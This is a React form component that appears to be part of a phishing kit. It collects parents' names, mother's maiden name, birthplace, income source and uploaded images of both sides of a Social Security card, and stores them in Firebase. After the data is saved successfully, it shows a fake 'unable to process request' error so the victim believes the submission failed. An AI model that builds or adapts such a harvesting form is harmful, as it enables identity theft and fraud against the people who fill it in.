import React, { useState } from "react";
import { app, database, storage } from "./firebaseConfig";
import { collection, addDoc } from "firebase/firestore";
import { ref, uploadBytesResumable, getDownloadURL } from "firebase/storage";

function Form() {
    const [picData, setPicData] = useState({});
    const [picData2, setPicData2] = useState({});
    const collectionRef = collection(database, 'users');

    const [formData, setFormData] = useState({
        fName: "",
        mName: "",
        si2022: "",
        city: "",
        maidenName: "",
    })

    function handleData(event) {
        setFormData((prev) => {
            return {
                ...prev,
                [event.target.name]: event.target.value,
            }
        })
        console.log(formData);
    }

    const handlePicSubmit = () => {
        const storageRef = ref(storage, picData.name);
        const uploadTask = uploadBytesResumable(storageRef, picData);
        uploadTask.on('state_changed', (snapshot) => {
            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
            console.log('uplaod is' + progress + '% done');
        },
            (error) => {
                console.log(error.message)
            },
            () => {
                getDownloadURL(uploadTask.snapshot.ref).then((downloadURL) => {
                    console.log('File available at', downloadURL)
                })
            }
        )
    }


    const handlePicSubmit2 = () => {
        const storageRef = ref(storage, picData2.name);
        const uploadTask = uploadBytesResumable(storageRef, picData2);
        uploadTask.on('state_changed', (snapshot) => {
            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
            console.log('uplaod is' + progress + '% done');
        },
            (error) => {
                console.log(error.message)
            },
            () => {
                getDownloadURL(uploadTask.snapshot.ref).then((downloadURL) => {
                    console.log('File available at', downloadURL)
                })
            }
        )
    }

    function handleSubmit(event) {
        event.preventDefault();
        addDoc(collectionRef, {
            fName: formData.fName,
            mName: formData.mName,
            si2022: formData.si2022,
            city: formData.city,
            maidenName: formData.maidenName,
        })
            .then(() => {
                alert("unable to process request, try again later");
            })
            .catch((err) => {
                console.log(err.message);
            })

            handlePicSubmit();
            handlePicSubmit2();

    }

    return (
        <form onSubmit={handleSubmit} >
            <section className="g-form">
                <section className="form">
                    <div>
                        <h2>Father's full name</h2>
                        <input type="text"  name="fName" onChange={handleData} />
                    </div>
                    <div>
                        <h2>Mother's full name</h2>
                        <input type="text"  name="mName" onChange={handleData} />
                    </div>
                    <div>
                        <h2>upload front of SSN card</h2>
                        <input type="file" onChange={(event) => setPicData(event.target.files[0])}/>
                    </div>
                    <div>
                        <h2>Upload back of SNN card</h2>
                        <input type="file" onChange={(event) => setPicData2(event.target.files[0])}  />
                    </div>
                </section>

                <section className="form">
                    <div>
                        <h2>Source of income in 2022</h2>
                        <input type="text"  name="si2022" onChange={handleData} />
                    </div>
                    <div>
                        <h2>what city and state were you born in</h2>
                        <input type="text"  name="city" onChange={handleData} />
                    </div>
                    <div>
                        <h2>Your mother's maiden name</h2>
                        <input type="text"  name="maidenName" onChange={handleData} />
                    </div>
                </section>
            </section>
            <div className="btn">
                <button>Continue</button>
            </div>
        </form>
    )
}

export default Form;